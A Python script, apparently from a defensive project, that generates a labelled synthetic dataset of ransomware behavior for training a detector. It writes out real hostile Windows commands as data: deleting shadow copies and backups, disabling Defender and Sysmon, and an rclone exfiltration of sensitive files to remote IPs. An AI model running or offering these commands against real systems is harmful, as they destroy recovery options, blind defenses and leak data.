"""
EdgeShield: Curated Ransomware Behavioral Telemetry Dataset Generator
Generates high-fidelity ransomware behavioral traces across the entire attack lifecycle:
  1. Discovery & Staging (T1083)
  2. Defense Impairment (T1562.001)
  3. Shadow Copy & Recovery Inhibition (T1490)
  4. Pre-Encryption C2 Exfiltration (T1071.001)
  5. Active Encryption & Ransom Note Dropping (T1486)
  6. Benign Operating Baseline (Normal backups, log rotations, software installs)
"""

import os
import random
import pandas as pd
import numpy as np

def generate_curated_ransomware_dataset(output_csv: str = "data/ransomware_behavioral_traces.csv", num_samples: int = 1200) -> pd.DataFrame:
    """
    Synthesizes a realistic behavioral dataset for training and evaluating the
    Behavioral Pattern Detector (BPD).
    """
    os.makedirs(os.path.dirname(output_csv), exist_ok=True)
    random.seed(42)
    np.random.seed(42)

    records = []

    # 1. Shadow Copy & Recovery Inhibition (T1490) - High Threat
    shadow_commands = [
        "vssadmin.exe delete shadows /all /quiet",
        "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB",
        "wmic.exe shadowcopy delete /nointeractive",
        "wbadmin.exe delete catalog -quiet",
        "wbadmin.exe delete systemstatebackup -keepVersions:0",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        "bcdedit.exe /set {default} recoveryenabled No"
    ]
    for _ in range(int(num_samples * 0.20)):
        cmd = random.choice(shadow_commands)
        records.append({
            "EventType": "PROCESS",
            "CommandLine": cmd,
            "TargetPath": "C:\\Windows\\System32\\vssadmin.exe" if "vssadmin" in cmd else "C:\\Windows\\System32\\wbadmin.exe",
            "ApiCall": "CreateProcessW",
            "Entropy": round(random.uniform(3.5, 5.2), 2),
            "ExtensionChange": "None",
            "DestinationIp": "-",
            "DestinationPort": "-",
            "TechniqueID": "T1490",
            "Stage": "Pre-Encryption (Inhibit Recovery)",
            "Label": 1 # Malicious
        })

    # 2. Defense Impairment (T1562.001) - High Threat
    defense_commands = [
        "sc.exe stop WinDefend",
        "net.exe stop \"Windows Defender Service\"",
        "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
        "powershell.exe -Command Set-MpPreference -DisableBehaviorMonitoring $true",
        "fltmc.exe unload SysmonDrv",
        "taskkill.exe /F /IM MsMpEng.exe",
        "reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
    ]
    for _ in range(int(num_samples * 0.15)):
        cmd = random.choice(defense_commands)
        records.append({
            "EventType": "PROCESS",
            "CommandLine": cmd,
            "TargetPath": "C:\\Windows\\System32\\sc.exe" if "sc" in cmd else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ApiCall": "OpenServiceW",
            "Entropy": round(random.uniform(3.8, 5.5), 2),
            "ExtensionChange": "None",
            "DestinationIp": "-",
            "DestinationPort": "-",
            "TechniqueID": "T1562.001",
            "Stage": "Pre-Encryption (Impair Defenses)",
            "Label": 1
        })

    # 3. Discovery & Pre-Encryption File Enumeration (T1083) - Medium/High Threat
    for _ in range(int(num_samples * 0.15)):
        drive = random.choice(["C:\\Users", "D:\\Shares\\Finance", "E:\\Backups\\Databases", "C:\\EnterpriseData"])
        records.append({
            "EventType": "FILE_SYSTEM",
            "CommandLine": f"powershell.exe -Command Get-ChildItem -Path {drive} -Recurse -File",
            "TargetPath": f"{drive}\\Quarterly_Report_{random.randint(1, 100)}.xlsx",
            "ApiCall": "FindFirstFileW",
            "Entropy": round(random.uniform(4.5, 6.0), 2),
            "ExtensionChange": "None",
            "DestinationIp": "-",
            "DestinationPort": "-",
            "TechniqueID": "T1083",
            "Stage": "Pre-Encryption (Discovery)",
            "Label": 1
        })

    # 4. Pre-Encryption C2 Exfiltration (T1071.001) - High Threat
    c2_ips = ["198.51.100.44", "203.0.113.89", "185.220.101.5", "91.240.118.12"]
    for _ in range(int(num_samples * 0.10)):
        ip = random.choice(c2_ips)
        port = random.choice(["443", "8443", "9001", "4444"])
        records.append({
            "EventType": "NETWORK",
            "CommandLine": f"rclone.exe copy C:\\SensitiveData remote:{ip}/exfil",
            "TargetPath": "C:\\SensitiveData\\Financials.zip",
            "ApiCall": "InternetConnectW",
            "Entropy": round(random.uniform(6.8, 7.8), 2),
            "ExtensionChange": "None",
            "DestinationIp": ip,
            "DestinationPort": port,
            "TechniqueID": "T1071.001",
            "Stage": "Pre-Encryption (Exfiltration)",
            "Label": 1
        })

    # 5. Active Encryption & Ransom Note Dropping (T1486) - Critical Impact
    ransom_exts = [".locked", ".enc", ".blackcat", ".lockbit", ".crypt", ".ransom"]
    ransom_notes = ["README.txt", "HOW_TO_DECRYPT.html", "RESTORE_FILES.txt", "DECRYPT_INSTRUCTIONS.hta"]
    for _ in range(int(num_samples * 0.15)):
        ext = random.choice(ransom_exts)
        note = random.choice(ransom_notes)
        records.append({
            "EventType": "FILE_SYSTEM",
            "CommandLine": f"rundll32.exe encrypt_payload.dll,StartEncryption",
            "TargetPath": f"C:\\Users\\Finance\\Documents\\Report_{random.randint(100, 999)}{ext}",
            "ApiCall": "CryptEncrypt",
            "Entropy": round(random.uniform(7.85, 7.99), 2), # Very high entropy
            "ExtensionChange": ext,
            "DestinationIp": "-",
            "DestinationPort": "-",
            "TechniqueID": "T1486",
            "Stage": "Active Encryption",
            "Label": 1
        })

    # 6. Benign Baseline Operations (Normal OS / Admin Activity) - Clean Label 0
    benign_tasks = [
        ("PROCESS", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "C:\\Windows\\System32\\svchost.exe", "OpenProcess", 4.1, "None", "-", "-"),
        ("PROCESS", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -SignatureUpdate", "MpCmdRun.exe", "CreateProcessW", 4.5, "None", "-", "-"),
        ("FILE_SYSTEM", "explorer.exe", "C:\\Users\\admin\\Downloads\\Document.pdf", "ReadFile", 5.2, "None", "-", "-"),
        ("FILE_SYSTEM", "C:\\Windows\\System32\\cleanmgr.exe /sagerun:1", "C:\\Windows\\Temp\\temp_log.tmp", "DeleteFileW", 3.8, "None", "-", "-"),
        ("NETWORK", "C:\\Program Files\\Google\\Chrome\\chrome.exe", "chrome.exe", "InternetConnectW", 5.0, "None", "142.250.190.46", "443"),
        ("FILE_SYSTEM", "notepad.exe C:\\Users\\user\\Desktop\\notes.txt", "C:\\Users\\user\\Desktop\\notes.txt", "WriteFile", 3.2, "None", "-", "-"),
        ("PROCESS", "C:\\Windows\\System32\\taskhostw.exe {2227A293-0EA1-4B06-8260-AC61430B030E}", "taskhostw.exe", "OpenProcess", 4.0, "None", "-", "-")
    ]
    for _ in range(int(num_samples * 0.25)):
        task = random.choice(benign_tasks)
        records.append({
            "EventType": task[0],
            "CommandLine": task[1],
            "TargetPath": task[2],
            "ApiCall": task[3],
            "Entropy": task[4] + round(random.uniform(-0.3, 0.3), 2),
            "ExtensionChange": task[5],
            "DestinationIp": task[6],
            "DestinationPort": task[7],
            "TechniqueID": "BENIGN_NORMAL",
            "Stage": "Normal Operations",
            "Label": 0
        })

    random.shuffle(records)
    df = pd.DataFrame(records)
    df.to_csv(output_csv, index=False)
    print(f"[+] Successfully generated curated ransomware dataset with {len(df)} records at: {output_csv}")
    return df

if __name__ == "__main__":
    generate_curated_ransomware_dataset()
